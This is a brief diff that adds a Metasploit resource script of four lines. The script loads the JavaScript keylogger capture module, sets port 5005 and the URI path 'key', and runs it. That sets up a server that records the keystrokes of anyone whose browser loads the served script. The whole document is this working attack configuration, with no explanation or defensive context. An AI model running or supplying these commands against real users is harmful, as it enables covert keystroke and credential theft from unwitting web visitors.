@@ -1,0 +1,4 @@
+use auxiliary/server/capture/http_javascript_keylogger
+set srvport 5005
+set uripath key
+run
